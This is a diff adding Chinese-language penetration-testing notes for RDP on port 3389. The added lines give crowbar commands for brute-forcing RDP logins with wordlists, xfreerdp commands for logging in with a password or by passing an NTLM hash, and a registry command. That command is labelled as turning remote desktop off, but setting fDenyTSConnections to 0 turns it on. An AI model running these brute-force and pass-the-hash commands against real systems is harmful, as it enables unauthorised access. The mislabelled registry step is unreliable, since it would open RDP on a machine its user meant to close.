@@ -139,3 +139,17 @@ RDP - TCP 3389
     libfreerdp-client2-2
     sudo dpkg –l | grep freerdp
 <img  alt="image" src="https://github.com/user-attachments/assets/9798b42a-0db9-43c3-928e-f1528f51da64">
+
+    暴力破解工具crowbar
+    sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 823BF07CEB5C469B
+    sudo apt install –y crowbar 
+    crowbar [-v] –b rdp –s <IP/CIDR> –u user –c password
+    crowbar [-v] –b rdp –s <IP/CIDR> –U Users.txt –C Passwords.txt
+
+    xfreerdp遠端桌面工具
+    xfreerdp /size:90% /v:<rdp_IP> /u:<user> /p:<password>
+    xfreerdp /size:90% /v:<rdp_IP> /u:<user> /pth:<ntlm_hash>
+<img alt="image" src="https://github.com/user-attachments/assets/c0f84645-6d65-4bd5-af98-4ab6844a165c">
+
+    關閉遠端桌面
+    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
